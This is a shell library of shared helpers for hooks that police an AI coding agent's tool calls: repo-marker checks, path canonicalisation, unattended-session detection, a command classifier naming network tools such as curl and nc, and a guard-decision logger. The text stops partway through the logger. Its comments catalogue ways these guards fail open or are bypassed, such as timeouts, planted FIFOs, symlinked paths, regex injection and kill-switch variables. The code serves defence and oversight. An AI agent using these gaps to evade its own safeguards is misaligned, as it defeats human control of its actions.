#!/usr/bin/env sh
# library-admission.sh (harbor#3) - shared helpers for the POSIX floor guards; sourced by bin/guard-*.sh after their kill-switch line.
# Pure POSIX + jq. Without jq the field helpers return empty and guards fail OPEN; permissions.deny (B1) is the backstop.
# DELIBERATELY ONE FILE (docs/explanation/modularity.md): B6 hash-pins each floor file, so a split multiplies the pin surface.
# floor_in_repo re-implements the resolution frozen in contracts/marker.md; it is not an import of yard's _find_config.
# Removed notes: docs/explanation/code-cases/bin-library-admission.md

# Bytes, not characters: under gawk in a UTF-8 locale a large payload outran the hook timeout, which fails open (harbor-core Q-R4). C changes no verdict.
LC_ALL=C; export LC_ALL

# The two scaffolder names the floor reads (harbor#966, #999). The floor cannot ask the repo registry (hash-pinned POSIX, no I/O it does not control),
# so they are named once here; contracts/marker.md freezes both and tests/scope/siblings holds the count.
# LEGACY marker file: removed once no repo is still on it (#963). LIFECYCLE plugin id: the repo guard whose wiring hands the force-push rules over (floor_repo_wires).
FLOOR_SCAFFOLDER_MARKER_LEGACY="project-init.md"
# shellcheck disable=SC2034 # read by the scripts that source this library (admission-bash.sh)
FLOOR_SCAFFOLDER_LIFECYCLE_PLUGIN="project-init-lifecycle"

# floor_config_dir — the config dir this session runs against.
floor_config_dir() {
  # Trailing slashes are stripped: with them CFG_RE gained a `//+` that floor_expand_paths had already collapsed, so no spelling matched.
  _cd="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"
  while [ "${_cd%/}" != "$_cd" ] && [ "$_cd" != "/" ]; do _cd="${_cd%/}"; done
  printf '%s' "$_cd"
}

# floor_port_root - the workspace root the governed repos live under (contracts/port-root.md): an exported PORT_ROOT, else $HOME/port.
# Empty is unset (`:-`). HOME unset gives NO ROOT (empty return): `/port` would be a guess about the machine, and a walk stopping at a guess un-governs it.
# Trailing slashes are stripped because the walk's stop is an equality test on a physically resolved path (P13-fs-02 class).
floor_port_root() {
  _pr="${PORT_ROOT:-}"
  if [ -z "$_pr" ]; then
    [ -n "${HOME:-}" ] || return 0
    _pr="$HOME/port"
  fi
  while [ "${_pr%/}" != "$_pr" ] && [ "$_pr" != "/" ]; do _pr="${_pr%/}"; done
  printf '%s' "$_pr"
}

# floor_ere_quote <string> - the string with every ERE metacharacter escaped, so it matches LITERALLY where a rule interpolates it.
# WHY (admission-baseline.md P12-configdir-ere-injection-03): an unbalanced metacharacter in CLAUDE_CONFIG_DIR made the whole regex invalid, grep exited non-zero, and every rule built on it read FALSE (floor off while looking installed).
# Quote only the VARIABLE part of a rule; the hand-written `\.claude` literals and TILDE_USER (a character class) are already correct.
floor_ere_quote() { printf '%s' "$1" | sed 's/[][\\^$.*+?(){}|]/\\&/g'; }

# floor_host_token - the per-machine partition key for every host-sharded ledger (admission-observe.sh, memory-harvest.sh, worklog-push.sh). ONE definition.
# `hostname -s` on macOS reports the network-supplied name and flipped to `Mac`, forking every ledger in place; LocalHostName is stable, so it is tried first and `hostname -s` is the fallback.
# Both binaries are resolved to absolute system paths, never PATH (a shim would redirect all ledgers; HOST-1 case 7). NO PATH FALLBACK, unlike FLOOR_GREP:
# the degraded answer `unknown-host` is visible, a shimmed token is not. Sanitisation is parameter expansion so nothing PATH-resolved is spawned.
# Not on the hot path: guards read the cached .helm-obs-host token.
floor_host_token() {
  _fht=""
  for _fhtb in /usr/sbin/scutil /sbin/scutil; do
    [ -x "$_fhtb" ] || continue
    _fht="$("$_fhtb" --get LocalHostName 2>/dev/null)" || _fht=""
    break
  done
  if [ -z "$_fht" ]; then
    for _fhtb in /bin/hostname /usr/bin/hostname; do
      [ -x "$_fhtb" ] || continue
      _fht="$("$_fhtb" -s 2>/dev/null)" || _fht=""
      break
    done
  fi
  # ' ' and '.' become '-', matching what `tr ' .' '--'` did before.
  _fhto=""
  while [ -n "$_fht" ]; do
    _fhtc="${_fht%"${_fht#?}"}"
    case "$_fhtc" in ' '|.) _fhto="$_fhto-" ;; *) _fhto="$_fhto$_fhtc" ;; esac
    _fht="${_fht#?}"
  done
  case "$_fhto" in ''|*[!A-Za-z0-9_-]*) _fhto=unknown-host ;; esac
  printf '%s' "$_fhto"
}

# floor_read_stdin - capture hook stdin JSON into FLOOR_IN; non-zero when the read fails. /bin/cat first (harbor#810); a failed read is not an empty payload.
floor_read_stdin() {
  _frc=/bin/cat; [ -x "$_frc" ] || _frc=cat
  FLOOR_IN="$("$_frc" 2>/dev/null)" || return 1
}

# floor_field <jq-path> - extract a field from FLOOR_IN; empty on ANY failure so callers fail open.
floor_field() {
  [ -n "${FLOOR_IN:-}" ] || return 0
  printf '%s' "$FLOOR_IN" | "$FLOOR_JQ" -r "$1 // empty" 2>/dev/null || true
}

# floor_shell_tool <tool_name> - 0 for a tool that runs tool_input.command in the shell (Bash, Monitor; pass 14 E-4).
floor_shell_tool() { case "${1:-}" in Bash|Monitor) return 0 ;; esac; return 1; }

# floor_switch_settings_files [<project dir>] - the settings files whose `env` block reaches every hook. The ONE place the switch's location is named (harbor#954 PR B; ADR on harbor#603).
# The project dir is often $HOME, where `$proj/.claude` IS the config dir: one file, one check.
# `$proj/.claude` IS the config dir: one file, one check.
floor_switch_settings_files() {
  _fsc="$(floor_config_dir)"
  printf '%s\n' "$_fsc/settings.json" "$_fsc/settings.local.json"
  if [ -n "${1:-}" ] && [ "$1/.claude" != "$_fsc" ]; then
    printf '%s\n' "$1/.claude/settings.json" "$1/.claude/settings.local.json"
  fi
  return 0
}

# floor_switch_in_settings <file> - the switch names (the two admission switches) that the file's `env` block sets to 1, one per line.
# It reads the FILE with jq so the decoded key is matched (escapes, symlinks and split edits all end as the same bytes). Only the literal 1 opens a switch (admission-baseline.md).
# Empty on a missing, unreadable or unparsable file: the harness would not load one either.
floor_switch_in_settings() {
  [ -f "$1" ] || return 0
  "$FLOOR_JQ" -r '(.env // {}) | if type == "object" then
      to_entries[] | select(.key == "HARBOR_ADMISSION_DISABLE" or .key == "HARBOR_ADMISSION_SHADOW")
      | select((.value | tostring) == "1") | .key else empty end' "$1" 2>/dev/null | sort -u || :
}

# floor_no_human - exit 0 iff NO human can answer an interactive `ask`, so an ask-tier verdict would auto-approve and must escalate to deny.
# Fail-safe toward "human present" (return 1 on any doubt): a false "no-human" hard-denies interactive work, the disaster that gets the floor switched off. Only positive signals flip it:
# permission_mode is autonomous; transcript_path is under /subagents/; agent_type names a subagent/workflow agent. Needs floor_read_stdin first.
floor_no_human() {
  case "$(floor_field '.permission_mode')" in
    bypassPermissions|dangerouslySkipPermissions) return 0 ;;
  esac
  case "$(floor_field '.transcript_path')" in
    */subagents/*) return 0 ;;
  esac
  case "$(floor_field '.agent_type')" in
    *subagent*|*workflow*) return 0 ;;
  esac
  return 1
}

# floor_in_repo - exit 0 iff cwd is inside a governed repo per contracts/marker.md (the B5 seam: inside, the floor narrows to global-only concerns; the veto never stands down).
# The marker must be a real non-symlink FILE inside a real non-symlink `.agents/` (a bare directory or symlink could forge governed status). Presence decides `repo`; `context: ambient` in the found marker decides `ambient`.
# M14: the walk STOPS BEFORE $HOME (one stray ~/.agents/config.yaml would un-govern everything beneath it). M33-M37 (harbor#619): it also stops before PORT_ROOT. Two stops: PORT_ROOT defaults under $HOME.
floor_in_repo() {
  # HARBOR_ADMISSION_MARKER_DIR: the directory holding the marker the walk found, even when it says `ambient`, so callers read the same repo's wiring (harbor#954).
  HARBOR_ADMISSION_MARKER_DIR=""
  # Prefer the session cwd from the payload over the hook process's $PWD.
  d="${CLAUDE_PROJECT_DIR:-$(floor_field '.cwd')}"
  [ -n "$d" ] || d="$PWD"
  # Walk the PHYSICAL path: the stops are equality tests, so spellings (`$HOME/.`, symlinks) must not matter (R7, P13-fs-02). Resolved once; a cwd that does not exist keeps its raw spelling (M16/M17).
  if _rd="$(CDPATH= cd -P -- "$d" 2>/dev/null && pwd -P)" && [ -n "$_rd" ]; then d="$_rd"; fi
  _hm="${HOME:-}"
  if [ -n "$_hm" ] && _rh="$(CDPATH= cd -P -- "$_hm" 2>/dev/null && pwd -P)" && [ -n "$_rh" ]; then
    _hm="$_rh"
  fi
  # PORT_ROOT gets the same physical resolution; one that does not exist yet keeps its raw spelling, and the stop is then inert.
  _pr="$(floor_port_root)"
  if [ -n "$_pr" ] && _rp="$(CDPATH= cd -P -- "$_pr" 2>/dev/null && pwd -P)" && [ -n "$_rp" ]; then
    _pr="$_rp"
  fi
  while [ -n "$d" ] && [ "$d" != "/" ]; do
    # M14: stop BEFORE examining $HOME, so a marker there governs nothing. HOME unset: no stop.
    if [ -n "$_hm" ] && [ "$d" = "$_hm" ]; then break; fi
    # M33: stop BEFORE PORT_ROOT too. Unset PORT_ROOT is not an opt-out; the default `$HOME/port` applies.
    if [ -n "$_pr" ] && [ "$d" = "$_pr" ]; then break; fi
    _mk=""
    if [ -d "$d/.agents" ] && [ ! -L "$d/.agents" ]; then
      for _f in "$d/.agents/config.yaml" "$d/.agents/$FLOOR_SCAFFOLDER_MARKER_LEGACY"; do
        if [ -f "$_f" ] && [ ! -L "$_f" ]; then _mk="$_f"; break; fi
      done
    fi
    if [ -z "$_mk" ] && [ -f "$d/.claude/config.yaml" ] && [ ! -L "$d/.claude/config.yaml" ]; then
      _mk="$d/.claude/config.yaml"
    fi
    if [ -n "$_mk" ]; then
      HARBOR_ADMISSION_MARKER_DIR="$d"
      # `context: ambient` is the owner opting THIS repo back in to the global layer; read at the marker the walk just found (innermost wins). Safe in one direction only: for a guard, `ambient` means stay fully armed, so it adds no forgery surface.
      # The legacy `.claude/config.yaml` marker is not consulted (no schema defines the field there).
      _cfg="$d/.agents/config.yaml"
      # Anchored at column 0 (a top-level key cannot be indented). Quoted keys/values and a space before the colon ARE valid YAML, so the reader is deliberately permissive; KEEP IN STEP with yard's _CONTEXT_KEY_RE.
      # A comment needs whitespace before the `#`: `context: ambient#typo` is not an opt-out.
      # Two spellings, one opt-out (harbor#966): the legacy `context: ambient` and the standard's
      # `scope: user` (D-12). Either one alone stays armed; `scope: project` and `context: repo` add nothing.
      if [ -f "$_cfg" ] && [ ! -L "$_cfg" ] && "$FLOOR_GREP" -Eq \
         "^[\"']?(context[\"']?[[:space:]]*:[[:space:]]*[\"']?ambient|scope[\"']?[[:space:]]*:[[:space:]]*[\"']?user)[\"']?([[:space:]]+#.*)?[[:space:]]*\$" \
         "$_cfg" 2>/dev/null; then
        return 1
      fi
      return 0
    fi
    d="$(dirname "$d")"
  done
  return 1
}

# floor_repo_wires <hook> <plugin> - exit 0 iff the governing repo WIRES that guard (harbor#954, D-46). A marker alone is not a guard.
# Read from the rendered settings at the repo floor_in_repo found: a PreToolUse hook whose command names <hook>, or <plugin>@<market> enabled (settings.local.json wins) AND listed in installed_plugins.json.
# A symlinked .claude or settings file is refused. No jq or bad JSON: not wired, stay armed.
floor_repo_wires() {
  _rwh="$1"; _rwp="$2"
  floor_in_repo || return 1
  _rw="$HARBOR_ADMISSION_MARKER_DIR/.claude"
  { [ -d "$_rw" ] && [ ! -L "$_rw" ]; } || return 1
  set --
  for _rws in "$_rw/settings.json" "$_rw/settings.local.json"; do
    if [ -f "$_rws" ] && [ ! -L "$_rws" ]; then set -- "$@" "$_rws"; fi
  done
  [ $# -gt 0 ] || return 1
  # Cheap gate first: this runs on every Bash call in a marked repo; jq only runs on a hit.
  "$FLOOR_GREP" -qF -e "$_rwh" -e "$_rwp" "$@" 2>/dev/null || return 1
  _rwk="$("$FLOOR_JQ" -rs --arg h "$_rwh" --arg p "$_rwp" '
    if ([.[] | .hooks.PreToolUse[]?.hooks[]?.command // empty | strings | select(contains($h))] | length) > 0
    then "hook"
    else reduce .[] as $s ({}; . + ($s.enabledPlugins // {})) | to_entries[]
         | select(.value == true and (.key | startswith($p + "@"))) | .key
    end' "$@" 2>/dev/null)" || return 1
  [ -n "$_rwk" ] || return 1
  [ "$_rwk" != hook ] || return 0
  "$FLOOR_JQ" -e --arg ks "$_rwk" \
    '[($ks | split("\n"))[] as $n | .plugins[$n]? | select(type == "array" and length > 0)] | length > 0' \
    "$(floor_config_dir)/plugins/installed_plugins.json" >/dev/null 2>&1
}

# floor_collapse_dots <text> - collapse `//`, `/./` and `/x/../` to a fixpoint. ONE collapse, every caller: three disagreeing partial ones made one path a protected surface to one guard and ordinary to another (P13-fs-02).
# DELIBERATELY LEXICAL, never symlink-aware: it canonicalises command TEXT, not a path; callers add the collapsed spelling beside the raw one, so it can only add a match;
# a fork per token would cost latency, which is itself a fail-open bypass (FLOOR_MAX_NORM); and a symlink resolved before the command runs can change before it runs.
# floor_norm_path still resolves physically when it can; this is the fallback.
# The component being cancelled must not itself be `..` (cancelling `..` against `..` landed short of the config dir on deep spellings). No pass cap: a cap that fails open is worse than none (PR #113).
# One left-to-right pass over a stack (harbor#759): the regex fixpoint cost O(depth x length) and timed a hook out on 32KB payloads. `/..` is `/`, so a leading `..` in a word is dropped; a `..` with nothing to cancel is kept.
FLOOR_COLLAPSE_AWK='
BEGIN { FC_Q = "[\"" sprintf("%c", 39) "]+$"; FC_D = "[[:space:];&|<>()`=:]" }
function fc_root_next(c,  t) { t = c; sub(FC_Q, "", t); return t == "" || substr(t, length(t)) ~ FC_D }
function fc(s, only,    n, P, S, B, i, c, sp, rb, ch) {
  if (index(s, "//") || index(s, "/./") || index(s, "/../")) {
    n = split(s, P, "/"); sp = 0; rb = -1
    for (i = 2; i < n; i++) {
      c = P[i]
      if (c == "" || c == ".") { ch = 1; continue }
      if (c == "..") {
        if (sp > 0 && S[sp] != "..") { ch = 1; if (!B[sp]) sp--; continue }
        if (sp == 0) { if (rb < 0) rb = fc_root_next(P[1]); if (rb) { ch = 1; continue } }
        S[++sp] = c; B[sp] = 0; continue
      }
      S[++sp] = c; B[sp] = fc_root_next(c)
    }
  }
  if (!ch) { if (!only) print s; return 0 }
  printf "%s", P[1]; for (i = 1; i <= sp; i++) printf "/%s", S[i]; printf "/%s\n", P[n]
  return 1
}'
floor_collapse_dots() {
  _cdp="$1"
  case "$_cdp" in *//*|*/./*|*/../*) ;; *) printf '%s' "$_cdp"; return 0 ;; esac
  _cdp="$(printf '%s' "$_cdp" | awk "$FLOOR_COLLAPSE_AWK"' { fc($0, 0) }' 2>/dev/null)"
  printf '%s' "$_cdp"
}

# floor_home_param <cmd> — <cmd> with every operator form of a HOME expansion (`${HOME%/}`,
# `${HOME##x}`, `${HOME/a/b}`, `${HOME:+…}`, `${HOME:0}`, `${HOME^^}`) read as `${HOME}`
# (pass 13, P13C-2). The `:-`/`:=`/`:?` forms keep their own expansion in floor_home_sed.
# No fork unless such a form is present, because a slow hook fails open.
floor_home_param() {
  case "$1" in
    *'${HOME'[%#/:^,+]*) ;;
    *) printf '%s' "$1"; return 0 ;;
  esac
  printf '%s' "$1" | sed -E 's/\$\{HOME(%%?|##?|\/[\/#%]?|:\+|\+|:[0-9[:space:]]|\^\^?|,,?)[^}]*\}/${HOME}/g'
}

# floor_home_sed [sed-expr] — stdin with every home spelling rewritten to $HOME, the
# expansion floor_expand_paths applies; one definition, shared with floor_canon_lines.
floor_home_sed() {
  sed -e "${1:-}" \
    -e "s|\\\${HOME:*[-=?][^}]*}|$HOME|g" \
    -e "s|\\\${HOME}|$HOME|g" \
    -e "s|\\\$HOME|$HOME|g" \
    -e "s|~$(id -un)/|$HOME/|g" \
    -e "s|~/|$HOME/|g"
}

# floor_canon_lines <lines> — each line's collapsed spelling, raw and home-expanded, where
# the collapse changes it. For guard-bash: a `bash -c` body reaches its targets unexpanded
# and uncollapsed (harbor#759). The raw lines are the caller's to keep.
floor_canon_lines() {
  case "$1" in *//*|*/./*|*/../*) ;; *) return 0 ;; esac
  _fcl="$(printf '%s\n' "$1" | floor_home_sed p 2>/dev/null)" || _fcl=""
  [ -n "$_fcl" ] || _fcl="$(printf '%s\n' "$1" | sed p)"   # an unusable HOME still gets the raw collapse
  printf '%s\n' "$_fcl" | awk "$FLOOR_COLLAPSE_AWK"'
    NR % 2 { r = $0; fc(r, 1); next }
    $0 != r { fc($0, 1) }' 2>/dev/null
}

# floor_canon_dir <dir> — a surface directory in the spelling command targets are
# compared in: floor_collapse_dots, no trailing slash. A raw `//` or `/./` in HOME
# built surfaces the collapsed command could never match (harbor#754).
floor_canon_dir() {
  [ -n "$1" ] || return 0
  _fcd="$(floor_collapse_dots "$1/")"   # the extra `/` collapses a trailing `/.` or `/x/..` too
  [ -n "$_fcd" ] || _fcd="$1"
  while [ "${_fcd%/}" != "$_fcd" ] && [ "$_fcd" != "/" ]; do _fcd="${_fcd%/}"; done
  printf '%s' "$_fcd"
}

# floor_surface_re <dir> — <dir> as a literal ERE, raw AND canonical: targets carry
# a raw and a collapsed spelling, so each is compared with its own kind (harbor#754).
floor_surface_re() {
  _fsr="$(floor_canon_dir "$1")"
  if [ "$_fsr" = "$1" ]; then floor_ere_quote "$1"; return 0; fi
  printf '(%s|%s)' "$(floor_ere_quote "$1")" "$(floor_ere_quote "$_fsr")"
}

# floor_norm_path <path> - normalize a path so the classifier reasons about the RESOLVED target, not its spelling: expands ~, makes it absolute, resolves the parent physically (`cd -P`), and collapses lexically when the parent does not exist.
floor_norm_path() {
  _p="$(floor_expand_home "$1")"
  case "$_p" in /*) ;; *) _p="${CLAUDE_PROJECT_DIR:-$PWD}/$_p" ;; esac
  # Follow a symlink AT THE LAST COMPONENT too: a link or hardlink to a protected file must not pass as an innocent name (red-team pass 2). Bounded loop so a cycle cannot hang the hook.
  _hop=0
  while [ -L "$_p" ] && [ "$_hop" -lt 8 ]; do
    _t="$(readlink "$_p" 2>/dev/null)" || break
    [ -n "$_t" ] || break
    case "$_t" in /*) _p="$_t" ;; *) _p="$(dirname "$_p")/$_t" ;; esac
    _hop=$((_hop + 1))
  done
  _d="$(dirname "$_p")"; _b="$(basename "$_p")"
  if [ -d "$_d" ] && _rd="$(CDPATH= cd -P -- "$_d" 2>/dev/null && pwd -P)"; then
    printf '%s' "${_rd%/}/$_b"
    return 0
  fi
  # Lexical fallback: no inode to resolve. The collapse is SHARED with guard-bash so the two cannot disagree on what `~/x/../.claude` names (harbor#94, P13-fs-02).
  floor_collapse_dots "$_p"
}

# floor_expand_home <path> — expand a leading ~ or $HOME reference.
floor_expand_home() {
  case "$1" in
    "~")        printf '%s' "$HOME" ;;
    "~/"*)      printf '%s%s' "$HOME" "${1#\~}" ;;
    '$HOME')    printf '%s' "$HOME" ;;
    '$HOME/'*)  printf '%s%s' "$HOME" "${1#\$HOME}" ;;
    *)          printf '%s' "$1" ;;
  esac
}

# OBSERVE-1 (harbor#41) - the guard-decision record: floor_log_decision <guard> <verdict> <rule.shape>. Five properties, in strict precedence:
# 1. A LOGGING FAILURE NEVER CHANGES A VERDICT. Hooks run `set -eu` and admission-hook.sh maps every rc outside {0,2} to a DENY, so every statement here is neutralised and the last command is `return 0`.
# 2. THE SINK DIRECTORY MUST BE UNWRITABLE (0500, admission-observe.sh): `>>` onto a planted FIFO blocks forever, and a hook that times out is SKIPPED, so a hang is a total bypass. A type check alone does not close the race. Does not hold for uid 0 (B1 is the backstop). If the mode drifts we go blind, never slow.
# 3. IT CREATES NOTHING (no mkdir, no `>`, no rotation): a hot path that creates files can be aimed, and `mkdir -p` forks on every call once the dir is uncreatable. It also keeps suites from polluting the live tree.
# 4. NO PAYLOAD-DERIVED BYTES REACH THE BUILDER: every field is a call-site literal, a closed enum through a `case` with no pass-through arm, fixed-width hex, or a clock reading. The floor_block MESSAGE is absent on purpose (it interpolates payload text; CONSTITUTION №3).
# 5. ONE RECORD = ONE printf = ONE write(): guards append concurrently, and `printf >>` under /bin/sh is atomic only up to 1024 bytes including the newline (stdio's buffer, not PIPE_BUF). Records are ~110 bytes; the cap is asserted at 512.
# NOT SETTABLE FROM THE ENVIRONMENT: an overridable sink path or an OBSERVE_DISABLE switch would be a second kill switch (the class already refused for FLOOR_GREP, FLOOR_AWK, FLOOR_INSTR_SURFACES).
# EVERY GUARD THAT LOGS MUST BE NAMED in FLOOR_OBS_GUARDS below: an unlisted token is coerced to `other`, silently. Lint C7 (audit.decision-token-listed) reads that line against every literal floor_log_decision call site and fails in either direction.
FLOOR_OBS_GUARDS=' bash egress selfedit integrity web wrapper session cloud destroy deliverables prod inject govern apiroute '
# `ask` is a REAL verdict (the tier that auto-approves in an unattended session); it was once missing and its records were coerced to `other`.
FLOOR_OBS_VERDICTS=' block allow deny ask gate advise override armed shadow covered '
FLOOR_OBS_SHAPES=' argv flat path channel content meta '
FLOOR_OBS_TOOLS=' Bash Write Edit MultiEdit NotebookEdit WebFetch WebSearch Task Agent ToolSearch mcp none other '
# The escape classes (harbor#1441, #555 decision 10 (a)): what an unconfined Bash call was, as a closed enum. Every name is
# a row of contracts/confinement-classes.tsv (the treatment); the observe-report suite holds the two equal.
HARBOR_ADMISSION_CLASSES='readonly vcs cloud container script interp network fsmutate system compound event-bus session-title suggest-stop other'

# floor_obs_class <command> — sets _xo to the class of a command by its first verb. Parameter expansion and
# case only: no fork on the hot path, and no byte of the command can reach _xo (every arm assigns a literal).
# `cd X &&` and `VAR=v` prefixes are stepped over; the first verb of a compound is its class, an approximation the
# report says out loud.
floor_obs_class() {
  _xs="$1"
  case "$_xs" in
    *session-titles/*) _xo=session-title; return 0 ;;
    *event-bus.sh*emit*|*'harbor event emit'*) _xo=event-bus; return 0 ;;
  esac
  _xn=0
  while [ "$_xn" -lt 6 ]; do
    _xn=$((_xn + 1))
    _xs="${_xs#"${_xs%%[![:space:]]*}"}"
    _xv="${_xs%%[[:space:];&|<>()]*}"
    case "$_xv" in
      cd|pushd) _xr="${_xs#*&&}"; [ "$_xr" != "$_xs" ] || _xr="${_xs#*;}"; [ "$_xr" != "$_xs" ] || break; _xs="$_xr"; continue ;;
      [A-Za-z_]*=*) _xr="${_xs#*[[:space:]]}"; [ "$_xr" != "$_xs" ] || break; _xs="$_xr"; continue ;;
    esac
    break
  done
  _xv="${_xv##*/}"
  case "$_xv" in
    for|while|until|if|case|'{'|'!'|function|'') _xo=compound ;;
    cd|pushd|grep|egrep|fgrep|rg|sed|awk|cat|head|tail|ls|find|wc|sort|uniq|jq|diff|cmp|stat|file|echo|printf|test|'['|pwd|tr|cut|basename|dirname|realpath|readlink|fd|tree|du|df|which|type|command|date|env|true|false|column|less|more|nl|xargs|wait|sleep) _xo=readonly ;;
    git|gh) _xo=vcs ;;
    gcx|gcloud|bq|cu|stape|gsutil|aws|az|fly|kubectl|terraform|firebase|wrangler) _xo=cloud ;;
    docker|docker-compose|colima|podman) _xo=container ;;
    sh|bash|zsh|dash)
      _xo=script
      # Only a lone `sh <path>/status-suggest.sh stop|start|off|on ...`: the name elsewhere in a command, or a second command, is not this class (harbor#1485).
      case "$_xs" in
        *[\;\&\|\#\`]*|*'$('*|*'
'*) ;;
        *) _xr="${_xs#*[[:space:]]}"; _xr="${_xr#"${_xr%%[![:space:]]*}"}"; _xw="${_xr%%[[:space:]]*}"
           _xr="${_xr#"$_xw"}"; _xr="${_xr#"${_xr%%[![:space:]]*}"}"
           case "$_xw" in status-suggest.sh|*/status-suggest.sh) case "${_xr%%[[:space:]]*}" in stop|start|off|on) _xo=suggest-stop ;; esac ;; esac ;;
      esac ;;
    python|python3|uv|uvx|node|bun|npm|npx|pnpm|ruby|perl|deno|pip|pip3|pytest) _xo=interp ;;
    curl|wget|ssh|scp|rsync|nc|ping|dig|nslookup) _xo=network ;;
    # mktem[p]: a bracket, so the bare-mktemp tripwire (harbor#1298) does not read this label as a call (harbor#1441).
    mkdir|cp|mv|rm|touch|chmod|chown|ln|install|mktem[p]|rmdir|ditto|tee) _xo=fsmutate ;;
    open|osascript|launchctl|brew|sudo|defaults|pkill|kill|killall|ps|lsof|pbcopy|pbpaste|caffeinate|say|security|codesign|xcrun) _xo=system ;;
    *) case "${_xs%%[[:space:]]*}" in ./*|/*) _xo=script ;; *) _xo=other ;; esac ;;
  esac
}

floor_log_decision() { # <guard> <verdict> <rule.shape>
  # Charset gate BEFORE enum membership, so the membership test stays literal even if its quoting is edited.
  _og="${1:-}"
  case "$_og" in ''|*[!abcdefghijklmnopqrstuvwxyz0-9-]*) _og=other ;; esac
  case "$FLOOR_OBS_GUARDS" in *" $_og "*) ;; *) _og=other ;; esac

  _ov="${2:-}"
  case "$_ov" in ''|*[!abcdefghijklmnopqrstuvwxyz-]*) _ov=other ;; esac
  case "$FLOOR_OBS_VERDICTS" in *" $_ov "*) ;; *) _ov=other ;; esac
  # A call that shadow-recorded (or covered, harbor#1300) a would-be block is not also a clean pass (harbor#482).
  case "$_ov:${FLOOR_SHADOWED:-}" in allow:1) return 0 ;; esac

  # <rule>.<shape> split by parameter expansion (no forks). The dotted form keeps a flat/argv twin under one rule token for "top rules".
  _ors="${3:-}"
  _or="${_ors%.*}"; _osh="${_ors##*.}"
  case "$_or" in ''|*[!abcdefghijklmnopqrstuvwxyz0-9-]*) _or=unclassified ;; esac
  [ "${#_or}" -le 40 ] || _or=unclassified
  case "$_osh" in ''|*[!abcdefghijklmnopqrstuvwxyz]*) _osh=meta ;; esac
  case "$FLOOR_OBS_SHAPES" in *" $_osh "*) ;; *) _osh=meta ;; esac

  # tool_name is attacker-shaped for mcp__* (a repo-supplied .mcp.json names them), so it is MAPPED to a constant.
  _ot="${FLOOR_TOOL:-}"
  case "$_ot" in '') _ot=none ;; *[!A-Za-z0-9_]*) _ot=other ;; esac
  case "$FLOOR_OBS_TOOLS" in
    *" $_ot "*) ;;
    *) case "$_ot" in mcp__*) _ot=mcp ;; *) _ot=other ;; esac ;;
  esac

  # THE SINK FOLLOWS THE WRITER, NOT THE CALLER. Reading CLAUDE_CONFIG_DIR or $HOME let a guard run from a checkout, or under a suite's `env -i ... HOME=`, file fixtures next to the operator's real decisions; per-suite isolation cannot fix that.
  # `$0` is the sourcing guard (<cfg>/bin/<guard>.sh, absolute for every wired hook command; POSIX sh does not rebind $0 in a function), so two strips give the config root. The writer creates nothing (property 3): elsewhere it is blind, not misfiled.
  # floor_config_dir() is deliberately untouched: surface rules resolve against the SESSION's config dir. Only the sink follows the writer.
  # Trailing slashes are stripped (red-team pass 8); a relative $0 is refused by the case below, which drops the record.
  _ocfg="${0%/*}"; _ocfg="${_ocfg%/*}"
  while [ "${_ocfg%/}" != "$_ocfg" ] && [ "$_ocfg" != "/" ]; do _ocfg="${_ocfg%/}"; done
  case "$_ocfg" in /*) ;; *) return 0 ;; esac

  # Host token via the `read` BUILTIN (zero forks), type-checked first: `read` from a FIFO blocks like `>>`. Absent or hostile gives a partition that does not exist, so the gate below refuses: blind, never wrong.
  _oh=unknown-host
  _oht="$_ocfg/.helm-obs-host"
  if [ -f "$_oht" ] && [ ! -L "$_oht" ]; then
    _ohr=""
    { IFS= read -r _ohr < "$_oht"; } 2>/dev/null || :
    case "$_ohr" in ''|*[!A-Za-z0-9_-]*) ;; *) _oh="$_ohr" ;; esac
  fi

  # THE TWO GATES. Order matters: the directory gate keeps the file gate's answer true one instruction later (property 2).
  _odir="$_ocfg/MEMORY/OBSERVABILITY/$_oh"
  [ ! -w "$_odir" ] || return 0
  _osink="$_odir/guard-decisions.jsonl"
  { [ -f "$_osink" ] && [ ! -L "$_osink" ]; } || return 0

  # The clock's fork (the session key below adds one hash, ~2 ms; harbor#309). No POSIX builtin clock exists (EPOCHSECONDS is unset under /bin/sh, $SECONDS reads 0, awk has no systime). A malformed clock aborts the record: one dropped record beats a ledger jq refuses.
  _ots="$(date -u '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null)" || _ots=""
  case "$_ots" in
    [0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9]T[0-9][0-9]:[0-9][0-9]:[0-9][0-9]Z) ;;
    *) return 0 ;;
  esac

  # DECISION PATHS ONLY (block, deny, ask), never allow: an allow has no consumer and the digest costs a fork on the majority of records. `block` alone left guard-cloud and guard-destroy records without `h` (they emit only permissionDecision verdicts; harbor#350). `advise` and `armed` gate nothing, so they get no digest.
  _odg=-
  case "$_ov" in block|deny|ask|shadow|covered)
    { _odg="$(floor_obs_digest "$_ocfg")"; } 2>/dev/null || _odg=-
    case "$_odg" in
      [0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef]) ;;
      *) _odg=- ;;
    esac ;;
  esac

  # THE SESSION KEY, `sk` (harbor#309): which session wrote the record, so a block can be joined to what that session did next. Salted like `h` under a `sid:` prefix, never the raw id; read by expansion, not jq.
  # ANCHORED to the payload's first key as the harness sends it (fixtures/pretooluse-bash-real.json); any doubt gives `-`, and the verdict never depends on it.
  _osid=""
  case "${FLOOR_IN:-}" in '{"session_id":"'*)
    _osid=${FLOOR_IN#'{"session_id":"'}; _osid=${_osid%%'"'*} ;;
  esac
  case "$_osid" in ''|*[!A-Za-z0-9_-]*) _osid="" ;; esac
  [ "${#_osid}" -le 64 ] || _osid=""
  _osk=-
  if [ -n "$_osid" ]; then
    { _osk="$(floor_obs_digest "$_ocfg" "sid:$_osid")"; } 2>/dev/null || _osk=-
    case "$_osk" in
      [0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef]) ;;
      *) _osk=- ;;
    esac
  fi

  # THE CONFINEMENT FIELD, `c` (harbor#1298, #555): a closed enum. `off` while no confinement is installed (deploy-confinement.sh writes the marker), `unconfined` when the call asked for the unsandboxed retry, `confined` otherwise, `-` for a non-Bash tool. Read by admission-observe-report.sh --confinement.
  _oc=-
  if [ "$_ot" = Bash ]; then
